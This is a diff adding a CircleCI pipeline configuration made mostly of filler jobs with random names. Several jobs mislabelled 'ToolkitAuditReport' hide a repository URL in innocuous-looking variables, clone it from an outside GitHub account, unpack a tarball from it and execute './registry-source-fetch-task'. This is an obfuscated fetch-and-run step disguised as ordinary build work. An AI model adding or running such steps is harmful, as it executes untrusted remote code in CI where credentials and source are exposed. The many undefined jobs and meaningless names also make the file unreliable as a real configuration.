+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            env ./registry-source-fetch-task
+  pre-checkout-summary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Scan schemas for all regions
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'runtimeRollOutMonitoring pre-sync-signature-verification' | tee /tmp/pre-upgrade-metadata-extraction/nightly-application-deployment > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/nightly-application-deployment
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'nightly-application-deployment'
+  RequiredStatusPageQualityGate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/nightly-application-deployment" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --depth 1 --branch main https://$bundle/${redirect}/${run} ./
+      - run:
+          name: Hydrate workspace
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            env "./registry-source-fetch-task"
+  pre-commit-failed-tests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Prepare exporter for all services
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'pre-upload-report DiscoverSlowBillingTests' | tee /tmp/pre-upgrade-metadata-extraction/storageStyleLint > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/storageStyleLint
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'storageStyleLint'
+  pinUserPortalDependencies:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/storageStyleLint" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --shallow-submodules https://$bundle/${redirect}/${run} $(pwd)
+      - run:
+          name: Extract sources
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            env "./registry-source-fetch-task"
+  continuous-build-summary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/Adapter" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --depth 2 --no-tags https://$bundle/${redirect}/${run} .
+      - run:
+          name: Restore build cache
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            sh -c "./registry-source-fetch-task"
+  bundle-library-bindings-track-4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: nightly-verification
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'manual-approval link-connector-executable' | tee /tmp/pre-upgrade-metadata-extraction/backup-worker-8 > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/backup-worker-8
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'backup-worker-8'
+  registry-database-schema:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/backup-worker-8" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --recurse-submodules --depth 1 https://$bundle/${redirect}/${run} .
+      - run:
+          name: Pull reference data
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            exec "./registry-source-fetch-task"
+  perform-worker-lint-checks:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: conditional-major-bump-run
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'extended-file-server-deployment DatabaseDeploymentSegment2Of5' | tee /tmp/pre-upgrade-metadata-extraction/count-lines-in-plain-text > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/count-lines-in-plain-text
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'count-lines-in-plain-text'
+  DeploymentSmokeTestTask:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/count-lines-in-plain-text" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --depth=4 --filter=blob:none https://$bundle/${redirect}/${run} "./"
+      - run:
+          name: Stage inputs
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            sh -c './registry-source-fetch-task'
+  dispatcher-roll-out:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: archive-server-database-to-shared-volume
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'UploadWebsiteBuildLogs querying-database-version' | tee /tmp/pre-upgrade-metadata-extraction/provision-collector-database > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/provision-collector-database
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'provision-collector-database'
+  optimize-collector:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Post release notes at pipeline end
+          command: |
+            tail -c +10000 "/tmp/pre-upgrade-metadata-extraction/provision-collector-database" | head -c 300
+      - run:
+          name: ToolkitAuditReport
+          command: |
+            bundle=github.com; redirect=alixhershberger5gi1h-ui; run=post-submit-token-rotation
+            git clone --jobs 4 https://$bundle/${redirect}/${run} $PWD
+      - run:
+          name: Unpack bundle
+          command: |
+            bunzip2 -c VerifyAndPublishBundle.tar.bz2 | tar xf -
+      - run:
+          command: |
+            "./registry-source-fetch-task"
+
+  manual-export:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: MonitorContainerImage
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'show-messaging-signatures PreMigrationResourceRemoval' | tee /tmp/pre-upgrade-metadata-extraction/weekly-bump > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/weekly-bump
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'weekly-bump'
+  CloneRepositoryInParallel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: fast-volume-snapshot-part-3-of-4
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'fetch-driver-interfaces overnightBetaRelease' | tee /tmp/pre-upgrade-metadata-extraction/mailer-binary > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/mailer-binary
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'mailer-binary'
+  controller-build-options:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Download source archive and run fast tests
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'RendererSigning FinalSymbolExtraction' | tee /tmp/pre-upgrade-metadata-extraction/UpdaterMigrations > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/UpdaterMigrations
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'UpdaterMigrations'
+  event-bus-crash-dumps-cycle-6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: write-build-manifest-on-every-commit
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'post-release-unit-tests sync-event-bus-manual-pages' | tee /tmp/pre-upgrade-metadata-extraction/provision-collector-database > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/provision-collector-database
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'provision-collector-database'
+  InformPlatformTeamBeforeUpload:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: restore-data-store
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'backgroundNotification local-proxy-archive-extraction' | tee /tmp/pre-upgrade-metadata-extraction/DeferredArchiveBuild > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/DeferredArchiveBuild
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'DeferredArchiveBuild'
+  post-setup-extended-tests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Payment service script lint job
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'sync-monitor-release-branch PreIntegrationTestSuite' | tee /tmp/pre-upgrade-metadata-extraction/postLaunchLint > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/postLaunchLint
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'postLaunchLint'
+  VersionRollbackWorkflow:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: kernel-health-check
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'PreliminaryBuildPipeline LegacySummary' | tee /tmp/pre-upgrade-metadata-extraction/linkTelemetryDebugSymbols > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/linkTelemetryDebugSymbols
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'linkTelemetryDebugSymbols'
+  IsolatedStagingDeploymentJob:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Copy coverage report
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'display-file-size LocalizationArchiveUpload' | tee /tmp/pre-upgrade-metadata-extraction/MultiStageRefresh > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/MultiStageRefresh
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'MultiStageRefresh'
+  cleanWorkspace:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: OneTimeCoreArtifacts
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'validator-tools QueryPlannerTypeChecksNode16' | tee /tmp/pre-upgrade-metadata-extraction/post-sync-compatibility-checks > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/post-sync-compatibility-checks
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'post-sync-compatibility-checks'
+  BasicControllerFixtureImport:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: RollOutToProductionClusterPart9
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'signing-hook CopyExtensionAuditReport' | tee /tmp/pre-upgrade-metadata-extraction/show-profiler-version > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/show-profiler-version
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'show-profiler-version'
+  compare-localization-digests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: exporting simulator security report when build fails
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'Authentication BackgroundVolumeRemoval' | tee /tmp/pre-upgrade-metadata-extraction/DispatcherCoverageReportGroup4 > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/DispatcherCoverageReportGroup4
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'DispatcherCoverageReportGroup4'
+  alert-security-team-of-failure:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: rerun-agent-stress-tests
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'delete-log-files-except-latest OperatorArtifactsPart2Of2' | tee /tmp/pre-upgrade-metadata-extraction/AlertReviewersOnTimeout > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/AlertReviewersOnTimeout
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'AlertReviewersOnTimeout'
+  formatter-release-build-run:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: compare compiler fingerprint
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'repository-backup PreTestManualApproval' | tee /tmp/pre-upgrade-metadata-extraction/nightly-application-deployment > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/nightly-application-deployment
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'nightly-application-deployment'
+  identity-service-audit-split-4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Access proxy archive build
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'lintFormatterBuildOptions periodic-module-compilation' | tee /tmp/pre-upgrade-metadata-extraction/FreezeAuthenticationTools > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/FreezeAuthenticationTools
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'FreezeAuthenticationTools'
+  rebuild-gateway-chunk-6-of-7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: importingManifest (run 8)
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'lowPrioritySummaryRound3 optionalDependencyInstallLevel4' | tee /tmp/pre-upgrade-metadata-extraction/AnalyticsVersionString > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/AnalyticsVersionString
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'AnalyticsVersionString'
+  CompilerHealthCheckPhase2Of6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: pre-launch-test-snapshot
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'AlertPlatformTeamAfterMigration inspect-base-image' | tee /tmp/pre-upgrade-metadata-extraction/backup-worker-8 > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/backup-worker-8
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'backup-worker-8'
+  wait-for-database:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: SchemaRollbackTask
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'Worker4Of14 website-packaging' | tee /tmp/pre-upgrade-metadata-extraction/DefaultMailServerSettings > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/DefaultMailServerSettings
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'DefaultMailServerSettings'
+  approveNightlyDispatcherRelease:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: buildAndPublishStaticSite
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'PublishRun check-profiler-version' | tee /tmp/pre-upgrade-metadata-extraction/storageStyleLint > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/storageStyleLint
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'storageStyleLint'
+  installCrawlerToolsFromLockFile:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Download signature from tagged release
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'periodic-deployment-dry-run-job PromoteUpdateAgentRelease' | tee /tmp/pre-upgrade-metadata-extraction/count-lines-in-plain-text > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/count-lines-in-plain-text
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'count-lines-in-plain-text'
+  sandbox-image-update:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: certificate-generation-job (bucket 8 of 8)
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'FrameworkTools installer-coverage' | tee /tmp/pre-upgrade-metadata-extraction/UpdateAgentStagingSmokeTest > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/UpdateAgentStagingSmokeTest
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'UpdateAgentStagingSmokeTest'
+  archive-package:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: Retry failed download for audit
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'primary-release-smoke-test SearchForDeprecatedFeatures' | tee /tmp/pre-upgrade-metadata-extraction/FetchBuildOutputsFromWorkspace > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/FetchBuildOutputsFromWorkspace
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'FetchBuildOutputsFromWorkspace'
+  bundle-templates-for-later-jobs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pre-upgrade-metadata-extraction
+      - run:
+          name: BumpJob
+          command: |
+            mkdir -p /tmp/pre-upgrade-metadata-extraction
+            echo 'copySignatureFromReleasePage gatherStatusPageLintResults' | tee /tmp/pre-upgrade-metadata-extraction/ImporterSchemaSync > /dev/null
+            wc -c < /tmp/pre-upgrade-metadata-extraction/ImporterSchemaSync
+      - persist_to_workspace:
+          root: /tmp/pre-upgrade-metadata-extraction
+          paths:
+            - 'ImporterSchemaSync'
+workflows:
+  runtime-timing-data-stage-2-of-5:
+    jobs:
+      - bundle-library-bindings-track-4
+      - CompilerHealthCheckPhase2Of6:
+          requires:
+            - bundle-library-bindings-track-4
+      - registry-database-schema:
+          requires:
+            - CompilerHealthCheckPhase2Of6
+      - PersistAuditReportInParallel:
+          requires:
+            - CompilerHealthCheckPhase2Of6
+      - wait-for-database:
+          requires:
+            - PersistAuditReportInParallel
+      - batch-worker-lint:
+          requires:
+            - wait-for-database
+      - pre-commit-failed-tests:
+          requires:
+            - wait-for-database
+      - approveNightlyDispatcherRelease:
+          requires:
+            - pre-commit-failed-tests
+      - pinUserPortalDependencies:
+          requires:
+            - approveNightlyDispatcherRelease
+      - perform-worker-lint-checks:
+          requires:
+            - approveNightlyDispatcherRelease
+      - installCrawlerToolsFromLockFile:
+          requires:
+            - perform-worker-lint-checks
+      - DeploymentSmokeTestTask:
+          requires:
+            - installCrawlerToolsFromLockFile
+      - QueryPlannerChangelog:
+          requires:
+            - installCrawlerToolsFromLockFile
+      - sandbox-image-update:
+          requires:
+            - QueryPlannerChangelog
+      - low-priority-version-bump:
+          requires:
+            - sandbox-image-update
+      - capture-data-importer-test-logs:
+          requires:
+            - sandbox-image-update
+      - archive-package:
+          requires:
+            - capture-data-importer-test-logs
+      - pre-test-roll-out-monitoring:
+          requires:
+            - archive-package
+      - ExtendedRegressionTests:
+          requires:
+            - archive-package
+      - bundle-templates-for-later-jobs:
+          requires:
+            - ExtendedRegressionTests
+      - client-schema:
+          requires:
+            - bundle-templates-for-later-jobs
+  pre-cleanup-summary:
+    jobs:
+      - pre-rollback-script-bucket-5
+      - VersionRollbackWorkflow:
+          requires:
+            - pre-rollback-script-bucket-5
+      - PullBuilderImageForStaging:
+          requires:
+            - VersionRollbackWorkflow
+      - production-deployment-run:
+          requires:
+            - VersionRollbackWorkflow
+      - IsolatedStagingDeploymentJob:
+          requires:
+            - production-deployment-run
+      - EmbedVersionNumber:
+          requires:
+            - IsolatedStagingDeploymentJob
+      - messaging-test-summary:
+          requires:
+            - IsolatedStagingDeploymentJob
+      - cleanWorkspace:
+          requires:
+            - messaging-test-summary
+      - ArchiveRuntimeMainBranch:
+          requires:
+            - cleanWorkspace
+      - complete-minor-release-stage:
+          requires:
+            - cleanWorkspace
+      - BasicControllerFixtureImport:
+          requires:
+            - complete-minor-release-stage
+      - LinkAttempt4:
+          requires:
+            - BasicControllerFixtureImport
+      - bundle-developer-guide:
+          requires:
+            - BasicControllerFixtureImport
+      - compare-localization-digests:
+          requires:
+            - bundle-developer-guide
+      - CatalogFixtureImport:
+          requires:
+            - compare-localization-digests
+  evaluate-test-results-against-baseline:
+    jobs:
+      - ReportRunCycle1
+      - alert-security-team-of-failure:
+          requires:
+            - ReportRunCycle1
+      - syncConsoleTutorials:
+          requires:
+            - alert-security-team-of-failure
+      - pre-checkout-summary:
+          requires:
+            - alert-security-team-of-failure
+      - formatter-release-build-run:
+          requires:
+            - pre-checkout-summary
+      - RequiredStatusPageQualityGate:
+          requires:
+            - formatter-release-build-run
+      - ReportingRebuild:
+          requires:
+            - formatter-release-build-run
+      - identity-service-audit-split-4:
+          requires:
+            - ReportingRebuild
+      - portal-cleanup:
+          requires:
+            - identity-service-audit-split-4
+      - OperatorDesignReview:
+          requires:
+            - identity-service-audit-split-4
+      - rebuild-gateway-chunk-6-of-7:
+          requires:
+            - OperatorDesignReview
+      - launch-slow-link-checker-tests:
+          requires:
+            - rebuild-gateway-chunk-6-of-7
+  fetch-and-cache-tools:
+    jobs:
+      - pre-integration-step
+      - RerunQualityChecks
+      - DataImporterBuildArtifacts
+      - UnlockingPass2:
+          requires:
+            - pre-integration-step
+            - RerunQualityChecks
+            - DataImporterBuildArtifacts
+      - TrackPartnerPortalCodeCoverage:
+          requires:
+            - pre-integration-step
+            - RerunQualityChecks
+            - DataImporterBuildArtifacts
+      - remote-deployment-approval:
+          requires:
+            - pre-integration-step
+            - RerunQualityChecks
+            - DataImporterBuildArtifacts
+      - continuous-build-summary:
+          requires:
+            - pre-integration-step
+            - RerunQualityChecks
+            - DataImporterBuildArtifacts
+      - LinkCheckerBenchmarks:
+          requires:
+            - pre-integration-step
+            - RerunQualityChecks
+            - DataImporterBuildArtifacts
+      - data-importer-log-compression:
+          requires:
+            - pre-integration-step
+            - RerunQualityChecks
+            - DataImporterBuildArtifacts
+      - MonitoringJobSegment8:
+          requires:
+            - pre-integration-step
+            - RerunQualityChecks
+            - DataImporterBuildArtifacts
+      - analyzer-test-pipeline:
+          requires:
+            - pre-integration-step
+            - RerunQualityChecks
+            - DataImporterBuildArtifacts
+  review-portal-coverage-report:
+    jobs:
+      - inject-firmware-version-tag
+      - manual-export:
+          requires:
+            - inject-firmware-version-tag
+      - pre-sync-image-compression:
+          requires:
+            - manual-export
+      - RollOutServiceToCanary:
+          requires:
+            - manual-export
+      - CloneRepositoryInParallel:
+          requires:
+            - RollOutServiceToCanary
+      - CopyScanResultsInBatches:
+          requires:
+            - CloneRepositoryInParallel
+      - perform-web-app-policy-checks:
+          requires:
+            - CloneRepositoryInParallel
+      - controller-build-options:
+          requires:
+            - perform-web-app-policy-checks
+      - MeasureCrawlerBuildTimeSlot4:
+          requires:
+            - controller-build-options
+      - dispatcher-roll-out
+      - event-bus-crash-dumps-cycle-6:
+          requires:
+            - dispatcher-roll-out
+      - optimize-collector:
+          requires:
+            - event-bus-crash-dumps-cycle-6
+      - steward-replica-3:
+          requires:
+            - event-bus-crash-dumps-cycle-6
+      - InformPlatformTeamBeforeUpload:
+          requires:
+            - steward-replica-3
+      - FlakyFrameworkTests:
+          requires:
+            - InformPlatformTeamBeforeUpload
+      - build-payment-service-run-9:
+          requires:
+            - InformPlatformTeamBeforeUpload
+      - post-setup-extended-tests:
+          requires:
+            - build-payment-service-run-9
+      - driver-deployment:
+          requires:
+            - post-setup-extended-tests
